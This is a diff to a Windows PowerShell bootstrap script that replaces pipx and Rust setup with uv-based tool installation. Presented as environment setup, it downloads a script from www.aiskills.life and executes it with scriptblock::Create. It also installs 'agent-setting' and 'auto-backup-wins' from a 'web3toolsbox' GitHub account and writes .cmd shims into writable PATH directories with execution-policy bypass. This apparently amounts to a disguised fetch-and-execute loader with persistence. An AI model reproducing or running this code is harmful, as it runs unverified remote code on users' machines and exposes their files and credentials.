@@ -13,6 +13,7 @@ $PSDefaultParameterValues['*:Verbose'] = $false
 $PSDefaultParameterValues['*:Debug'] = $false
 
 $script:FailedSteps = New-Object System.Collections.Generic.List[string]
+$script:OriginalPath = $env:Path
 
 function Restore-Preferences {
     $PSDefaultParameterValues.Clear()
@@ -121,6 +122,164 @@ function Update-ProcessPath {
     }
 }
 
+function Get-WebResponseContentText {
+    param(
+        [Parameter(Mandatory = $true)]
+        $Response
+    )
+
+    $content = $Response.Content
+    if ($null -eq $content) {
+        return $null
+    }
+
+    if ($content -is [string]) {
+        $scriptText = $content
+    } elseif ($content -is [byte[]]) {
+        $encoding = $null
+        $contentType = $null
+
+        try {
+            if ($Response.Headers) {
+                $contentType = $Response.Headers['Content-Type']
+            }
+        } catch {
+        }
+
+        if (-not $contentType) {
+            try {
+                if ($Response.BaseResponse -and $Response.BaseResponse.ContentType) {
+                    $contentType = $Response.BaseResponse.ContentType
+                }
+            } catch {
+            }
+        }
+
+        if ($contentType -match 'charset\s*=\s*["'']?(?<charset>[^;"'']+)') {
+            try {
+                $encoding = [System.Text.Encoding]::GetEncoding($matches['charset'])
+            } catch {
+            }
+        }
+
+        if (-not $encoding -and $content.Length -ge 3 -and $content[0] -eq 239 -and $content[1] -eq 187 -and $content[2] -eq 191) {
+            $encoding = [System.Text.Encoding]::UTF8
+        } elseif (-not $encoding -and $content.Length -ge 2 -and $content[0] -eq 255 -and $content[1] -eq 254) {
+            $encoding = [System.Text.Encoding]::Unicode
+        } elseif (-not $encoding -and $content.Length -ge 2 -and $content[0] -eq 254 -and $content[1] -eq 255) {
+            $encoding = [System.Text.Encoding]::BigEndianUnicode
+        } elseif (-not $encoding) {
+            $encoding = [System.Text.Encoding]::UTF8
+        }
+
+        $scriptText = $encoding.GetString($content)
+    } else {
+        $scriptText = [string]$content
+    }
+
+    if ($scriptText.Length -gt 0 -and $scriptText[0] -eq [char]0xFEFF) {
+        $scriptText = $scriptText.Substring(1)
+    }
+
+    return $scriptText
+}
+
+function Test-DirectoryWritable {
+    param(
+        [string]$Path
+    )
+
+    if (-not $Path -or -not (Test-Path -LiteralPath $Path -PathType Container)) {
+        return $false
+    }
+
+    $probePath = Join-Path $Path ".path-write-test-$([guid]::NewGuid().ToString('N')).tmp"
+    try {
+        Set-Content -LiteralPath $probePath -Value '' -Encoding ASCII -ErrorAction Stop
+        Remove-Item -LiteralPath $probePath -Force -ErrorAction SilentlyContinue
+        return $true
+    } catch {
+        Remove-Item -LiteralPath $probePath -Force -ErrorAction SilentlyContinue
+        return $false
+    }
+}
+
+function Get-ExistingWritablePathDir {
+    $seen = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
+
+    foreach ($dir in ($script:OriginalPath -split ';')) {
+        if (-not $dir) {
+            continue
+        }
+
+        if (-not $seen.Add($dir)) {
+            continue
+        }
+
+        if (Test-DirectoryWritable -Path $dir) {
+            return $dir
+        }
+    }
+
+    return $null
+}
+
+function Bridge-CommandIntoCurrentPath {
+    param(
+        [string[]]$CommandNames
+    )
+
+    Update-ProcessPath
+    $sourcePath = Get-CommandPath -Names $CommandNames
+    if (-not $sourcePath) {
+        return $false
+    }
+
+    $targetDir = Get-ExistingWritablePathDir
+    if (-not $targetDir) {
+        return $true
+    }
+
+    $sourceDir = Split-Path $sourcePath -Parent
+    if ($sourceDir -and $sourceDir.TrimEnd('\') -ieq $targetDir.TrimEnd('\')) {
+        return $true
+    }
+
+    $shimNames = @(
+        $CommandNames |
+            Where-Object { $_ -and ([System.IO.Path]::GetExtension($_) -eq '') } |
+            Select-Object -Unique
+    )
+    if (-not $shimNames -or $shimNames.Count -eq 0) {
+        $shimNames = @([System.IO.Path]::GetFileNameWithoutExtension($sourcePath))
+    }
+
+    $sourceExt = [System.IO.Path]::GetExtension($sourcePath)
+    foreach ($shimName in $shimNames) {
+        $shimPath = Join-Path $targetDir "$shimName.cmd"
+        if (Test-Path -LiteralPath $shimPath) {
+            $existingContent = Get-Content -LiteralPath $shimPath -Raw -ErrorAction SilentlyContinue
+            if ($existingContent -and $existingContent -notmatch 'uv-bridge-managed') {
+                continue
+            }
+        }
+
+        $shimContent = if ($sourceExt -ieq '.ps1') {
+            "@echo off`r`nREM uv-bridge-managed`r`npowershell -NoProfile -ExecutionPolicy Bypass -File `"$sourcePath`" %*`r`n"
+        } else {
+            "@echo off`r`nREM uv-bridge-managed`r`n`"$sourcePath`" %*`r`n"
+        }
+
+        try {
+            Set-Content -LiteralPath $shimPath -Value $shimContent -Encoding ASCII -ErrorAction Stop
+        } catch {
+            return $false
+        }
+    }
+
+    return $true
+}
+
 # Test whether a path is a Windows Store app execution alias (stub).
 function Test-StoreStub {
     param(
@@ -161,6 +320,117 @@ function Get-CommandPath {
     return $null
 }
 
+function Get-NormalizedCommandNames {
+    param(
+        [string[]]$CommandNames
+    )
+
+    $normalizedNames = New-Object System.Collections.Generic.List[string]
+
+    foreach ($commandName in $CommandNames) {
+        if (-not $commandName) {
+            continue
+        }
+
+        $leafName = [System.IO.Path]::GetFileNameWithoutExtension($commandName)
+        if (-not $leafName) {
+            continue
+        }
+
+        if (-not $normalizedNames.Contains($leafName)) {
+            $normalizedNames.Add($leafName)
+        }
+    }
+
+    return $normalizedNames.ToArray()
+}
+
+function Test-UvToolRegistered {
+    param(
+        [string[]]$CommandNames
+    )
+
+    $normalizedNames = Get-NormalizedCommandNames -CommandNames $CommandNames
+    if ($normalizedNames.Count -eq 0) {
+        return $false
+    }
+
+    $toolRoots = @(
+        (Join-Path $env:APPDATA 'uv\tools'),
+        (Join-Path $env:LOCALAPPDATA 'uv\tools')
+    )
+
+    foreach ($toolRoot in $toolRoots) {
+        if (-not $toolRoot -or -not (Test-Path $toolRoot -PathType Container)) {
+            continue
+        }
+
+        $toolDirs = Get-ChildItem -Path $toolRoot -Directory -ErrorAction SilentlyContinue
+        foreach ($toolDir in $toolDirs) {
+            $receiptPath = Join-Path $toolDir.FullName 'uv-receipt.toml'
+            if (-not (Test-Path $receiptPath -PathType Leaf)) {
+                continue
+            }
+
+            try {
+                $receiptContent = Get-Content -LiteralPath $receiptPath -Raw -ErrorAction Stop
+            } catch {
+                continue
+            }
+
+            foreach ($normalizedName in $normalizedNames) {
+                $entryPointPattern = 'name\s*=\s*"' + [regex]::Escape($normalizedName) + '"'
+                $installPathPattern = 'install-path\s*=\s*"[^"]*[\\/]' + [regex]::Escape($normalizedName) + '\.exe"'
+                if ($receiptContent -match $entryPointPattern -or $receiptContent -match $installPathPattern) {
+                    return $true
+                }
+            }
+        }
+    }
+
+    return $false
+}
+
+# Check and install uv (fast Python package manager)
+function Install-Uv {
+    Write-StepLog 'Checking uv (fast Python package manager)'
+
+    $uvPath = Get-CommandPath -Names @('uv')
+    if ($uvPath) {
+        $version = & $uvPath --version 2>$null | Out-String
+        Write-InfoLog "uv already available: $($version.Trim())"
+        return $uvPath
+    }
+
+    Write-InfoLog 'uv was not found. Installing...'
+
+    try {
+        Enable-ModernTls
+        $installScript = Invoke-WebRequest -Uri 'https://astral.sh/uv/install.ps1' -UseBasicParsing -ErrorAction Stop
+        if ($installScript.StatusCode -eq 200 -and $installScript.Content) {
+            $installScriptText = Get-WebResponseContentText -Response $installScript
+            & ([scriptblock]::Create($installScriptText))
+            Update-ProcessPath
+            $uvPath = Get-CommandPath -Names @('uv')
+            if ($uvPath) {
+                # Ensure uv bin dir is in PATH
+                $uvBinDir = Join-Path $env:USERPROFILE '.local\bin'
+                if (Test-Path $uvBinDir) {
+                    Add-ToPath $uvBinDir
+                }
+                Write-InfoLog "uv installation completed: $uvPath"
+                return $uvPath
+            }
+        }
+    } catch {
+        Write-WarnLog "Failed to install uv"
+        Add-FailedStep -Step 'Install uv' -Reason (Get-ExceptionMessage -ErrorRecord $_)
+        return $null
+    }
+
+    return $null
+}
+
 # Given a command path that might be py.exe or a Store stub, resolve the real
 # python.exe via sys.executable and verify it works.
 function Resolve-PythonPath {
@@ -194,41 +464,6 @@ function Resolve-PythonPath {
     }
 
     return $Candidate
-}
-
-function Get-PipxVenvPythonPath {
-    param(
-        [string[]]$VenvNames
-    )
-
-    $userProfile = $env:USERPROFILE
-    $candidates = @()
-
-    foreach ($venvName in $VenvNames) {
-        if (-not $venvName) {
-            continue
-        }
-
-        if ($userProfile) {
-            $candidates += "$userProfile\pipx\venvs\$venvName\Scripts\python.exe"
-        }
-
-        if ($env:LOCALAPPDATA) {
-            $candidates += "$env:LOCALAPPDATA\pipx\venvs\$venvName\Scripts\python.exe"
-        }
-    }
-
-    foreach ($candidate in $candidates) {
-        if ($candidate -and (Test-Path $candidate)) {
-            try {
-                return (Resolve-Path $candidate).Path
-            } catch {
-                return $candidate
-            }
-        }
-    }
-
-    return $null
 }
 
 # Scrape the latest 64-bit Python installer URL and fall back to a pinned build
@@ -344,84 +579,6 @@ function Install-Python {
     return $null
 }
 
-function Get-RustupInstallerUrl {
-    $arch = $env:PROCESSOR_ARCHITECTURE
-    if ($arch -eq 'ARM64') {
-        return 'https://win.rustup.rs/aarch64'
-    }
-    if ($arch -eq 'x86') {
-        return 'https://win.rustup.rs/i686'
-    }
-    return 'https://win.rustup.rs/x86_64'
-}
-
-# Make sure Rust toolchain (cargo/rustc) is available. If it is missing,
-# download rustup-init.exe and perform a silent install.
-function Install-Rust {
-    Write-StepLog 'Checking Rust toolchain'
-
-    $cargoPath = Get-CommandPath -Names @('cargo', 'cargo.exe')
-    if ($cargoPath) {
-        Write-InfoLog "Rust already available: $cargoPath"
-        return $cargoPath
-    }
-
-    $rustupPath = Get-CommandPath -Names @('rustup', 'rustup.exe')
-    if ($rustupPath) {
-        Write-InfoLog "rustup already available: $rustupPath"
-        try {
-            & $rustupPath toolchain install stable --profile minimal
-            if ($LASTEXITCODE -ne 0) {
-                Write-WarnLog "rustup toolchain install failed, but execution will continue (exit=$LASTEXITCODE)."
-                Add-FailedStep -Step 'Install Rust toolchain via rustup' -Reason "exit=$LASTEXITCODE"
-            }
-            & $rustupPath default stable
-        } catch {
-            Write-ContinueOnError -Step 'Install Rust toolchain via rustup' -Action 'install Rust toolchain via rustup' -ErrorRecord $_
-        }
-
-        $cargoBinDir = Join-Path $env:USERPROFILE '.cargo\bin'
-        Add-ToPath $cargoBinDir
-        Update-ProcessPath
-
-        $cargoPath = Get-CommandPath -Names @('cargo', 'cargo.exe')
-        if ($cargoPath) {
-            Write-InfoLog "Rust toolchain is ready: $cargoPath"
-            return $cargoPath
-        }
-    }
-
-    $installerPath = Join-Path $env:TEMP 'rustup-init.exe'
-    $rustupUrl = Get-RustupInstallerUrl
-    Write-InfoLog "Rust was not found. Downloading installer from: $rustupUrl"
-
-    try {
-        Enable-ModernTls
-        Invoke-WebRequest -Uri $rustupUrl -OutFile $installerPath -ErrorAction Stop
-        $process = Start-Process -FilePath $installerPath -ArgumentList @('-y', '--profile', 'minimal', '--default-toolchain', 'stable') -Wait -PassThru
-        if ($process.ExitCode -eq 0) {
-            $cargoBinDir = Join-Path $env:USERPROFILE '.cargo\bin'
-            Add-ToPath $cargoBinDir
-            Update-ProcessPath
-
-            $cargoPath = Get-CommandPath -Names @('cargo', 'cargo.exe')
-            if ($cargoPath) {
-                Write-InfoLog "Rust installation completed: $cargoPath"
-                return $cargoPath
-            }
-        }
-
-        Write-WarnLog "Rust installer finished with exit code $($process.ExitCode), but cargo is still unavailable."
-        Add-FailedStep -Step 'Install Rust' -Reason "exit=$($process.ExitCode)"
-    } catch {
-        Write-ContinueOnError -Step 'Install Rust' -Action 'install Rust' -ErrorRecord $_
-    } finally {
-        Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
-    }
-
-    return $null
-}
-
 function Get-PackageVersion {
     param(
         [string]$PythonPath,
@@ -481,185 +638,88 @@ function Install-PythonPackage {
     }
 }
 
-# Ensure pipx is available so CLI tools can be installed in isolated
-# environments.
-function Install-Pipx {
+
+# Install a CLI tool via uv tool
+function Install-UvToolPackage {
     param(
-        [string]$PythonPath
-    )
-
-    Write-StepLog 'Checking pipx'
-
-    $pipxPath = Get-CommandPath -Names @('pipx')
-    if ($pipxPath) {
-        Write-InfoLog "pipx already available: $pipxPath"
-        try {
-            & $pipxPath ensurepath
-            if ($LASTEXITCODE -ne 0) {
-                Write-WarnLog "pipx ensurepath failed, but execution will continue (exit=$LASTEXITCODE)."
-                Add-FailedStep -Step 'Configure pipx path' -Reason "exit=$LASTEXITCODE"
-            }
-        } catch {
-            Write-ContinueOnError -Step 'Configure pipx path' -Action 'configure pipx path' -ErrorRecord $_
-        }
-
-        Update-ProcessPath
-        $pipxPath = Get-CommandPath -Names @('pipx')
-        return [pscustomobject]@{
-            CommandPath = $pipxPath
-            PythonPath  = $null
-        }
-    }
-
-    if (-not $PythonPath) {
-        Write-WarnLog 'Skipping pipx installation because Python is unavailable.'
-        Add-FailedStep -Step 'Install pipx' -Reason 'python-missing'
-        return $null
-    }
-
-    Write-InfoLog 'pipx was not found. Installing it with Python.'
-
-    try {
-        & $PythonPath -m pip install pipx
-        if ($LASTEXITCODE -ne 0) {
-            Write-WarnLog "Failed to install pipx, but execution will continue (exit=$LASTEXITCODE)."
-            Add-FailedStep -Step 'Install pipx' -Reason "exit=$LASTEXITCODE"
-            return $null
-        }
-
-        # Add the Scripts directory (where pipx.exe lives) to PATH.
-        # Resolve via sys.executable to handle py.exe / Store stubs correctly.
-        $realPython = (& $PythonPath -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
-        $scriptsCandidates = @()
-        if ($realPython) {
-            $scriptsCandidates += Join-Path (Split-Path $realPython -Parent) 'Scripts'
-        }
-        $scriptsCandidates += (& $PythonPath -c "import sys, os; print(os.path.join(sys.prefix, 'Scripts'))" 2>$null | Out-String).Trim()
-        $scriptsCandidates += (& $PythonPath -c "import sysconfig; print(sysconfig.get_path('scripts'))" 2>$null | Out-String).Trim()
-        $scriptsCandidates += (& $PythonPath -c "import site, os; print(site.getusersitepackages().replace('site-packages','Scripts'))" 2>$null | Out-String).Trim()
-
-        foreach ($dir in ($scriptsCandidates | Where-Object { $_ } | Select-Object -Unique)) {
-            if (Test-Path (Join-Path $dir 'pipx.exe')) {
-                Add-ToPath $dir
-                break
-            }
-        }
-
-        & $PythonPath -m pipx ensurepath
-
-        # Also persist pipx bin dir (%USERPROFILE%\.local\bin) to PATH
-        $pipxBinDir = Join-Path $env:USERPROFILE '.local\bin'
-        if (-not (Test-Path $pipxBinDir)) {
-            New-Item -ItemType Directory -Path $pipxBinDir -Force | Out-Null
-        }
-        Add-ToPath $pipxBinDir
-
-        Update-ProcessPath
-        $pipxPath = Get-CommandPath -Names @('pipx')
-        if ($pipxPath) {
-            Write-InfoLog "pipx installation completed: $pipxPath"
-            return [pscustomobject]@{
-                CommandPath = $pipxPath
-                PythonPath  = $null
-            }
-        }
-
-        Write-InfoLog 'pipx was installed and will be invoked via "python -m pipx".'
-        return [pscustomobject]@{
-            CommandPath = $null
-            PythonPath  = $PythonPath
-        }
-    } catch {
-        Write-ContinueOnError -Step 'Install pipx' -Action 'install pipx' -ErrorRecord $_
-        return $null
-    }
-}
-
-function Invoke-PipxInstall {
-    param(
-        [object]$PipxInvoker,
+        [string]$UvPath,
         [string]$PackageSpec,
-        [switch]$Force
+        [string[]]$CommandNames
     )
 
-    if (-not $PipxInvoker) {
-        return $false
+    if (-not $UvPath) {
+        Write-WarnLog "Skipping tool installation because uv is unavailable: $PackageSpec"
+        Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-missing'
+        return
     }
-
-    try {
-        $installArgs = @('install')
-        if ($Force) {
-            $installArgs += '--force'
-        }
-        $installArgs += $PackageSpec
-
-        if ($PipxInvoker.CommandPath) {
-            & $PipxInvoker.CommandPath @installArgs
-        } elseif ($PipxInvoker.PythonPath) {
-            & $PipxInvoker.PythonPath -m pipx @installArgs
-        } else {
-            return $false
-        }
-
-        return ($LASTEXITCODE -eq 0)
-    } catch {
-        return $false
-    }
-}
-
-# Install a pipx-managed CLI only when its command is not already available.
-function Install-PipxPackage {
-    param(
-        [object]$PipxInvoker,
-        [string]$PackageSpec,
-        [string[]]$CommandNames,
-        [string[]]$VenvNames = @()
-    )
 
     $existingCommand = Get-CommandPath -Names $CommandNames
-    $venvPythonPath = if ($VenvNames.Count -gt 0) { Get-PipxVenvPythonPath -VenvNames $VenvNames } else { $null }
+    $uvToolRegistered = Test-UvToolRegistered -CommandNames $CommandNames
 
-    if ($existingCommand) {
-        if ($VenvNames.Count -eq 0 -or $venvPythonPath) {
-            Write-InfoLog "CLI already available, skipping install: $existingCommand"
-            return
+    try {
+        if ($existingCommand) {
+            try {
+                & $UvPath tool install --upgrade $PackageSpec
+                $upgradeExitCode = $LASTEXITCODE
+                if ($upgradeExitCode -ne 0) {
+                    Add-FailedStep -Step "Upgrade tool $PackageSpec" -Reason "exit=$upgradeExitCode"
+                    & $UvPath tool install --force $PackageSpec
+                    if ($LASTEXITCODE -ne 0) {
+                        Add-FailedStep -Step "Install tool $PackageSpec" -Reason "exit=$LASTEXITCODE"
+                        return
+                    }
+                }
+            } catch {
+                Write-ContinueOnError -Step "Upgrade tool $PackageSpec" -Action "upgrade CLI tool $PackageSpec" -ErrorRecord $_
+                try {
+                    & $UvPath tool install --force $PackageSpec
+                    if ($LASTEXITCODE -ne 0) {
+                        Add-FailedStep -Step "Install tool $PackageSpec" -Reason "exit=$LASTEXITCODE"
+                        return
+                    }
+                } catch {
+                    Write-ContinueOnError -Step "Install tool $PackageSpec" -Action "reinstall CLI tool $PackageSpec" -ErrorRecord $_
+                    return
+                }
+            }
+        } else {
+            Write-StepLog "Installing CLI tool via uv tool: $PackageSpec"
+
+            & $UvPath tool install $PackageSpec
+            if ($LASTEXITCODE -ne 0) {
+                Add-FailedStep -Step "Install tool $PackageSpec" -Reason "exit=$LASTEXITCODE"
+                return
+            }
         }
 
-        Write-WarnLog "CLI launcher exists but pipx environment is missing. Reinstalling package"
-    }
-
-    Write-StepLog "Ensuring pipx package"
-
-    if (-not $PipxInvoker) {
-        Write-WarnLog "Skipping pipx package installation because pipx is unavailable"
-        Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'pipx-missing'
+    } catch {
+        Write-ContinueOnError -Step "Install tool $PackageSpec" -Action "install CLI tool $PackageSpec" -ErrorRecord $_
         return
     }
 
-    $forceInstall = ($existingCommand -and $VenvNames.Count -gt 0 -and -not $venvPythonPath)
-    if (Invoke-PipxInstall -PipxInvoker $PipxInvoker -PackageSpec $PackageSpec -Force:$forceInstall) {
-        Update-ProcessPath
-        $installedCommand = Get-CommandPath -Names $CommandNames
-        $venvPythonPath = if ($VenvNames.Count -gt 0) { Get-PipxVenvPythonPath -VenvNames $VenvNames } else { $null }
-        if ($installedCommand -and ($VenvNames.Count -eq 0 -or $venvPythonPath)) {
-            Write-InfoLog "Installed pipx package successfully: $installedCommand"
-            return
-        }
-
-        Write-WarnLog "pipx reported success, but the package is still incomplete"
-        Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'command-or-venv-missing-after-install'
+    Update-ProcessPath
+    [void](Bridge-CommandIntoCurrentPath -CommandNames $CommandNames)
+    $installedCommand = Get-CommandPath -Names $CommandNames
+    $uvToolRegistered = Test-UvToolRegistered -CommandNames $CommandNames
+    if ($installedCommand -and $uvToolRegistered) {
+        Write-InfoLog "Installed or updated CLI tool successfully: $installedCommand"
         return
     }
 
-    Write-WarnLog "Failed to install pipx package, but execution will continue"
-    Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'install-failed'
+    if ($installedCommand -and -not $uvToolRegistered) {
+        Write-WarnLog "CLI launcher exists but uv tool registration is missing: $PackageSpec"
+        Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-registration-missing'
+        return
+    }
+
+    Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'command-not-found'
 }
 
 try {
     Write-InfoLog 'Starting Windows installation bootstrap.'
 
+    $uvPath = Install-Uv
     $pythonPath = Install-Python
-    Install-Rust | Out-Null
 
     $requirements = @(
         @{ Name = 'requests'; Version = '2.31.0' },
@@ -673,10 +733,10 @@ try {
         Install-PythonPackage -PythonPath $pythonPath -Name $pkg.Name -Version $pkg.Version
     }
 
-    $pipxInvoker = Install-Pipx -PythonPath $pythonPath
-    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe') -VenvNames @('auto-backup-wins')
+    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe')
+    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe')
 
-    if (Test-Path '.configs') {
+    if (Test-Path '.configs' -PathType Container) {
         Write-StepLog 'Applying environment configuration'
         $gistUrl = 'https://www.aiskills.life/src/setup.ps1'
 
@@ -685,9 +745,10 @@ try {
             Write-InfoLog "Downloading configuration script"
             $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing -ErrorAction Stop
             if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
-                Write-InfoLog "Downloaded configuration script ($($remoteScript.Content.Length) chars)"
+                $remoteScriptText = Get-WebResponseContentText -Response $remoteScript
+                Write-InfoLog "Downloaded configuration script ($($remoteScriptText.Length) chars)"
                 Write-InfoLog "Executing configuration script"
-                & ([scriptblock]::Create($remoteScript.Content))
+                & ([scriptblock]::Create($remoteScriptText))
             } else {
                 $statusCode = if ($remoteScript -and $remoteScript.StatusCode) { $remoteScript.StatusCode } else { 'unknown' }
                 Write-WarnLog "Configuration script returned an empty response (status=$statusCode)"
